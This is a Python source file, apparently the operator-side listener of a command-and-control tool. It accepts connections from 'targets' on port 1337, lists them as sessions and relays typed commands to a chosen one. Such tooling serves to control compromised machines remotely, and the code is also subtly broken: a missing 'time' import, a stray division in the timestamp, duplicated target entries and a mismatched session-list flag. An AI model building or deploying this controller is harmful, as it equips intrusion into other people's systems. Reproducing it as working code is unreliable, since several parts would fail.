import socket
import sys
import threading
from prettytable import PrettyTable
from datetime import datetime

def comm_in(targ_id):
    print('[+] Awaiting response...')
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())
    
    
def target_comm(targ_id):
    while True:
        message = input('send message#> ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
            print(response)

def listener_handler():
    # bind to local address
    sock.bind((host_ip, host_port))
    print('[+] Its so quiet')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()
    
    
    
def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            cur_time = time.strftime(":%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day/date.year}{cur_time}")
            targets.append([remote_target, remote_ip[0], time_record])
            print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command #>', end="")
        except:
            pass




################
# main function
################

if __name__ == '__main__':
    
    #targets list var
    targets = []
    
    # set kill flag
    kill_flag = 0
    ##############################
    # socket.AF_INET = IPV4 address family used in sockets where we will be referring
    # to socket connections through a host IP and port address scheme (AF_INET6 would refer to IPV6)

    # SOCK_STREAM = communication channel that allows communications to occur from one point to another
    #       Until that communication is terminated
    ##############################

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #host_ip = sys.argv[1]
        #host_port = int(sys.argv[2])
        
        host_ip = '127.0.0.1'
        host_port = 1337
        # call listener handler
    except IndexError: 
        print('[-] Command line argument(s) missing. Please try again.')
    except Exception as fail:
            print(f"[-] Closing ... Exception caught {fail}")
            sock.close()
    listener_handler()
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split (" ")[1] == '-1':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Target']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, target[1]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print("\n[-] Keyboard interrupt issued")
            kill_flag = 1
            message = 'Exiting due to keyboard interrupt'
            sock.close()
            break
